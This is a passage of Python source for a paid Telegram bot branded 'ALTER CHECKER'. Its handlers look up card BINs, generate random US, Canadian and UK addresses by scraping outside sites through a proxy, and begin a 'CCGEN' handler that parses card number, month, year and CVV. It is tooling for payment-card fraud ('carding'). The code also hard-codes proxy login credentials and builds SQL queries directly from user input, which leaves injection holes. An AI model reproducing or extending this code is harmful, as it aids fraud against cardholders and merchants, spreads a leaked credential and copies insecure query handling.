        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if not await CheckAccess(message.chat.id, message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    matchcc = re.sub("[^0-9]", "", VerMessage)
    if 3 <= int(matchcc[0:1]) <= 6 : CcVerify = matchcc
    else : CcVerify = None
    if not CcVerify:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncorrect ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>xxxxxx</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    result = await ConnectDB.run_query(f"SELECT * FROM bins WHERE bin='{CcVerify[0:6]}'")
    if len(result) != 0 :
        result = json.loads(json.dumps(result[0]))
        type = result['type']
        level = result['level']
        brand = result['brand']
        bank = result['bank']
        country = result['country']
        emoji = result['Emoji']
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ BIN LOOKUP [✅] ↯\n- - - - - - - - - - - - - - - - - - - - -\nBin - ↯ [ <code>{CcVerify[0:6]}</code> ]\nInfo - ↯ [ <code>{brand}</code> | <code>{type}</code> | <code>{level}</code> ]\nBank - ↯ [ <code>{bank}</code> ]\nCountry - ↯ [ <code>{country} {emoji}</code> ]\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    else :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ INVALID BIN. ⚠️ ↯\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return


@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",", "#"], commands=["dd"])
async def CMDreedem(message: types.Message):
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    WaitStatus = await VerifyStatus('dd')
    if (WaitStatus[0] == 'OFFLINE ❌') or (WaitStatus[0] == 'OFFLINE1 ❌') :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nRandom 🔥 Address\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {WaitStatus[0]} ]\nFormat: <code>$dd US, CA, UK</code>\nComment: </b>{WaitStatus[2]}\n<b>Update Since: </b>{WaitStatus[1]}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError :
            UserSince = datetime.datetime.now().strftime("%d-%m-%Y")
            await ConnectDB.run_query(f"INSERT INTO pruebas (ID, UserSince) VALUES ('{message.from_user.id}', '{UserSince}')")
            
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
    
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    VerMessage = message.text[4:]
    if not re.sub("[^a-zA-Z]", "", VerMessage) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nRandom 🔥 Address\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>$dd US, CA, UK</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if not await CheckAccess(message.chat.id, message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    VerMessage = VerMessage.upper()
    if VerMessage == 'US' : 
        addgen = VerMessage
    elif VerMessage == 'CA' : 
        addgen = VerMessage
    elif VerMessage == 'UK' : 
        addgen = VerMessage
    else :
        addgen = None
    if not addgen:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncorrect ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>$dd US, CA, UK</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError : print("Unexpected error, not Registered User!")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    UltimoCheck = result['UltimoCheck']
    TimeAntiSpam = result['TimeAntiSpam']
    hora_actual = calendar.timegm(datetime.datetime.utcnow().utctimetuple())

    ad = int(hora_actual) - int(UltimoCheck)
    tiempofaltante = int(TimeAntiSpam) - int(ad)

    if int(ad) < int(TimeAntiSpam):
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ ANTISPAM ⚠️ ] ↯\n- - - - - - - - - - - - - - - - - - - - -\nTest again in {tiempofaltante} seconds !\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    else : await ConnectDB.run_query(f"UPDATE pruebas SET ID='{message.from_user.id}' , UltimoCheck={hora_actual} WHERE ID='{message.from_user.id}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    await CheckPRM(message.chat.type, message.from_user.id, message.chat.id)
    result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
    result = json.loads(json.dumps(result[0]))
    UserStatus =  result['Status']

    if not message.from_user.username: UserName = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>";
    else : UserName = f'@{message.from_user.username}'
    
    if VerMessage == 'US' :
        import random_address
        genaddr = random_address.real_random_address()
        #genaddr = json.loads(genaddr)
        address = genaddr['address1']
        try :
            City = genaddr['city']
        except KeyError :
            City = '-'
        try :
            State = genaddr['state']
        except KeyError :
            State = '-'
        Zip_Code = genaddr['postalCode']
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nRandom 🔥 Address [↯]\n- - - - - - - - - - - - - - - - - - - - -\nAddress - ↯ <code>{address}</code>\nCity - ↯ <code>{City}</code>\nState - ↯ <code>{State}</code>\nZip Code - ↯ <code>{Zip_Code}</code>\n- - - - - - - - - - - - - - - - - - - - -\nChecked by - ↯ {UserName} [{UserStatus}]</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    elif VerMessage == 'CA' :
        async with aiohttp.ClientSession() as session:
            try:     
                session.headers.update({
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
                    'Accept': '*/*',
                    'Accept-Language': 'es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3',
                    # 'Accept-Encoding': 'gzip, deflate, br',
                    'Referer': 'https://www.meiguodizhi.com/ca-address?hl=en',
                    'content-type': 'application/json',
                    'Origin': 'https://www.meiguodizhi.com',
                    'Connection': 'keep-alive',
                    })
                data = {
                    "city":"",
                    "path":"/ca-address",
                    "method":"refresh"
                }
                async with session.post('https://www.meiguodizhi.com/api/v1/dz', json=data, timeout=15, proxy=str("http://pxu29137-0:zdXn8128FgC7D5QXpm5n@x.botproxy.net:8080/")) as resp:       
                    response = await resp.json()
                    address = response['address']['Address']
                    City = response['address']['City']
                    State = response['address']['State']
                    Zip_Code = response['address']['Zip_Code']
            except UnboundLocalError :
                await session.close()
                return 'An unexpected error occurred in request 01. It was not generated correctly. ♻️'  
            except TypeError :
                await session.close()
                return 'An unexpected error occurred in request 01. It was not generated correctly. ♻️'
            except aiohttp.client_exceptions.ContentTypeError :
                await session.close()
                return 'An unexpected error occurred in request 01. It was not generated correctly. ♻️'
    elif VerMessage == 'UK' :
        async with aiohttp.ClientSession() as session:
            try:     
                session.headers.update({
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0',
                    'Accept': 'application/json, text/javascript, */*; q=0.01',
                    'Accept-Language': 'es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3',
                    # 'Accept-Encoding': 'gzip, deflate, br',
                    'X-Requested-With': 'XMLHttpRequest',
                    'Connection': 'keep-alive',
                    'Referer': 'https://postal-code.co.uk/postcode/London',
                    # Requests sorts cookies= alphabetically
                    # 'Cookie': '__utma=249660167.1101903003.1659372958.1659379338.1659395029.3; __utmz=249660167.1659372958.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); euconsent-v2=CPdBusAPdBusAAKAqAENCaCsAP_AAH_AABpYI6td_X__bW9j-_5_aft0eY1P9_r37uQzDhfNk-8F3L_W_LwXx2E7NF36pq4KmR4Eu1LBIQNlHMHUDUmwaokVrzHsak2cpyNKJ7JEknMZO2dYGF9Pn1tjuYKY7_5_9_bx2D-t_9_-39T378Xf3_dp_2_-_vCfV599jfn9fV_789KP9_79v-_8__________3_4I7AEmGrcQBdmWODNoGEUKIEYVhIVQKACCgGFogsAHBwU7KwCXWELABAKEIwIgQ4gowYBAAIJAEhEAEgRYIBEARAIAAQAIgEIAGJgEFgBYGAQAAgGhYoBQACBIQZEBEcpgQFQJBQS2ViCUFehphAHWeAFBojYqABEkgIpAQEhYOAYIkBLxZIGmKN8gBGCFAKJUAA.fngAAAAAAAAA; addtl_consent=1~39.4.3.9.6.9.13.6.4.15.9.5.2.7.4.1.7.1.3.2.10.3.5.4.21.4.6.9.7.10.2.9.2.18.7.6.14.5.20.6.5.1.3.1.11.29.4.14.4.5.3.10.6.2.9.6.6.4.5.4.4.29.4.5.3.1.6.2.2.17.1.17.10.9.1.8.6.2.8.3.4.142.4.8.42.15.1.14.3.1.8.10.25.3.7.25.5.18.9.7.41.2.4.18.21.3.4.2.7.6.5.2.14.18.7.3.2.2.8.20.8.8.6.3.10.4.20.2.13.4.6.4.11.1.3.22.16.2.6.8.2.4.11.6.5.33.11.8.1.10.28.12.1.3.21.2.7.6.1.9.30.17.4.9.15.8.7.3.6.6.7.2.4.1.7.12.13.22.13.2.12.2.10.5.15.2.4.9.4.5.4.7.13.5.15.4.13.4.14.8.2.15.2.5.5.1.2.2.1.2.14.7.4.8.2.9.10.18.12.13.2.18.1.1.3.1.1.9.25.4.1.19.8.4.5.3.5.4.8.4.2.2.2.14.2.13.4.2.6.9.6.3.4.3.5.2.3.6.10.11.6.3.16.3.11.3.1.2.3.9.19.11.15.3.10.7.6.4.3.4.6.3.3.3.3.1.1.1.6.11.3.1.1.11.6.1.10.5.2.6.3.2.2.4.3.2.2.7.15.7.12.2.1.3.3.4.5.4.3.2.2.4.1.3.1.1.1.2.9.1.6.9.1.5.2.1.7.2.8.11.1.3.1.1.2.1.3.2.6.1.12.5.3.1.3.1.1.2.2.7.7.1.4.1.2.6.1.2.1.1.3.1.1.4.1.1.2.1.8.1.7.4.3.2.1.3.5.3.9.6.1.15.10.28.1.2.2.12.3.4.1.6.3.4.7.1.3.1.1.3.1.5.3.1.3.2.2.1.1.4.2.1.2.1.2.2.2.4.2.1.2.2.2.4.1.1.1.2.2.1.1.1.1.2.1.1.1.2.2.1.1.2.1.2.1.7.1.2.1.1.1.2.1.1.1.1.2.1.1.3.2.1.1.8.1.1.1.5.2.1.6.5.1.1.1.1.1.2.2.3.1.1.4.1.1.2.2.1.1.4.3.1.2.2.1.2.1.2.3.1.1.2.4.1.1.1.5.1.3.6.3.1.5.2.3.4.1.2.3.1.4.2.1.2.2.2.1.1.1.1.1.1.11.1.3.1.1.2.2.5.2.3.3.5.1.1.1.4.2.1.1.2.5.1.9.4.1.1.3.1.7.1.4.5.1.7.2.1.1.1.2.1.1.1.4.2.1.12.1.1.3.1.2.2.3.1.2.1.1.1.2.1.1.2.1.1.1.1.2.1.3.1.5.1.2.4.3.8.2.2.9.7.2.3.2.1.4.6.1.1.6.1.1; __qca=P0-1739271107-1659372958351; __gads=ID=c90bf303920e980a-2202d30a47d40006:T=1659372959:RT=1659372959:S=ALNI_MZjFG8u8FMGs6rL3RdQ_VrgxVAq9Q; __gpi=UID=0000078db231ca84:T=1659372959:RT=1659395029:S=ALNI_MbfHAQJ3lgUoVuw3Yfr6uzb-HstpQ; 682de13fa716953be10fec7bc55c8510=3ebcffcf5de0f7b93e4ad9015594857d; __utmc=249660167; __utmb=249660167.1.10.1659395029; __utmt=1',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-origin',
                    })
                params = {
                    'lat': f'51.{random.randint(100000,999999)}60604846',
                    'lng': f'-0.13157844543457034',
                }
                async with session.post('https://postal-code.co.uk/ajax/reverse.php', params=params, timeout=15, proxy=str("http://pxu29137-0:zdXn8128FgC7D5QXpm5n@x.botproxy.net:8080/")) as resp:       
                    response = await resp.text()
                    response = json.loads(response)
                    address = response[0]
                    zipcode = response[2]
            except UnboundLocalError :
                await session.close()
                return 'An unexpected error occurred in request 01. It was not generated correctly. ♻️'  
            except TypeError :
                await session.close()
                return 'An unexpected error occurred in request 01. It was not generated correctly. ♻️'
            except aiohttp.client_exceptions.ContentTypeError :
                await session.close()
                return 'An unexpected error occurred in request 01. It was not generated correctly. ♻️'
            try :
                await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nRandom 🔥 Address [↯]\n- - - - - - - - - - - - - - - - - - - - -\nAddress - ↯ <code>{address}</code>\nZip Code - ↯ <code>{zipcode}</code>\n- - - - - - - - - - - - - - - - - - - - -\nChecked by - ↯ {UserName} [{UserStatus}]</b>", reply_to_message_id=message.message_id)
                return
            except TimeoutError or exceptions.RetryAfter as e:
                await asyncio.sleep(e.value)
                return
    try :
        await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nRandom 🔥 Address [↯]\n- - - - - - - - - - - - - - - - - - - - -\nAddress - ↯ <code>{address}</code>\nCity - ↯ <code>{City}</code>\nState - ↯ <code>{State}</code>\nZip Code - ↯ <code>{Zip_Code}</code>\n- - - - - - - - - - - - - - - - - - - - -\nChecked by - ↯ {UserName} [{UserStatus}]</b>", reply_to_message_id=message.message_id)
        return
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
        return

@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",", "#"], commands=["gen"])
async def CMDgen(message: types.Message):
    NameGateway = 'Tool 🔥 CCGEN'
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    WaitStatus = await VerifyStatus('gen')
    if (WaitStatus[0] == 'OFFLINE ❌') or (WaitStatus[0] == 'OFFLINE1 ❌') :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {WaitStatus[0]} ]\nFormat: <code>cc|mon|year|cvv</code>\nComment: </b>{WaitStatus[2]}\n<b>Update Since: </b>{WaitStatus[1]}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError :
            UserSince = datetime.datetime.now().strftime("%d-%m-%Y")
            await ConnectDB.run_query(f"INSERT INTO pruebas (ID, UserSince) VALUES ('{message.from_user.id}', '{UserSince}')")
            
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (await VerifyBanned(f'{message.from_user.id}')) == 'Yes' :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are banned from this bot.\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
            
    if message.reply_to_message:
        try :
            VerMessage = re.sub("\n", " ", message.reply_to_message.text)
        except TypeError:
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
    else :
        VerMessage = re.sub("\n", " ", message.text[5:])
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if re.sub("[^0-9]", "", VerMessage) == '':
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    inicio = time.time()
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if not await CheckAccess(message.chat.id, message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.sender_chat:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are forbidden from this bot. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.forward_from:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nThe use of forwarded messages is prohibited. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return 
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try:
        VerMessage = ''.join(['x' if c.isalpha() else c for c in VerMessage])
        VerMessage = re.sub("[^0-9a-zA-Z]", " ", VerMessage)
        matchcc = re.findall(r"\b[0-9a-zA-Z]{6,16}\b", VerMessage)
        l = []
        for cc in matchcc:
            if cc[0:6].isnumeric():
                l.append(cc)
        CCnum = l[0] if l else 'xxxxxx'
    except UnboundLocalError:
        CCnum = 'xxxxxx'
        
    try :
        mes = re.sub("[^0-9]", " ", VerMessage)
        BinCheck = int(CCnum[0:1])
        if 3 <= int(BinCheck) <= 6 :
            if 4 <= int(BinCheck) <= 6 :
                matchmes = re.findall(r"\b(0[1-9]|1[0-2])\b", mes)
                mes = matchmes[0]
            elif int(BinCheck) == 3 :
                matchmes = re.findall(r"\b(0[1-9]|1[0-2])\b", mes)
                mes = matchmes[0]
    except :
            mes = 'xx'
    try :
        ano = re.sub("[^0-9]", " ", VerMessage)
        BinCheck = int(CCnum[0:1])
        if 3 <= int(BinCheck) <= 6 :
            if 4 <= int(BinCheck) <= 6 :
                matchano = re.findall(r"\b(3[0-1]|2[2-9]|202[2-9]|203[0-1])\b", ano)
                ano = matchano[0]
                if len(ano) == 2 :
                    ano = f'20{ano}'
            elif int(BinCheck) == 3 :
                matchano = re.findall(r"\b(3[0-1]|2[2-9]|202[2-9]|203[0-1])\b", ano)
                ano = matchano[0]
                if len(ano) == 2 :
                    ano = f'20{ano}'
    except :
        ano = 'xxxx'
    try :
        cvv = re.sub("[^0-9a-zA-Z]", " ", VerMessage)
        BinCheck = int(CCnum[0:1])
        if 3 <= int(BinCheck) <= 6 :
            if 4 <= int(BinCheck) <= 6 :
                matchcvv = re.findall(r"\b[0-9a-zA-Z][0-9a-zA-Z][0-9a-zA-Z]\b", cvv.lower())
                cvv = matchcvv[0]
                cvv = re.sub("[^0-9x]", "x", cvv)
                cvv = cvv.ljust(3, 'x')
                cvv = cvv[0:3]
            elif int(BinCheck) == 3 :
                matchcvv = re.findall(r"\b[0-9a-zA-Z][0-9a-zA-Z][0-9a-zA-Z][0-9a-zA-Z]\b", cvv.lower())
                cvv = matchcvv[0]
                cvv = re.sub("[^0-9x]", "x", cvv)
                cvv = cvv.ljust(4, 'x')
                cvv = cvv[0:4]
    except :
        cvv = 'rnd'
    try :
        VerMessage = f'{CCnum}|{mes}|{ano}|{cvv}'
    except UnboundLocalError as e:
        print(e)
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        result = await ConnectDB.run_query(f"SELECT * FROM bins WHERE bin='{VerMessage[0:6]}'")
        result = json.loads(json.dumps(result[0]))
        type = result['type']
        level = result['level']
        brand = result['brand']
        bank = result['bank']
        emoji = result['Emoji']
    except :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncorrect ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
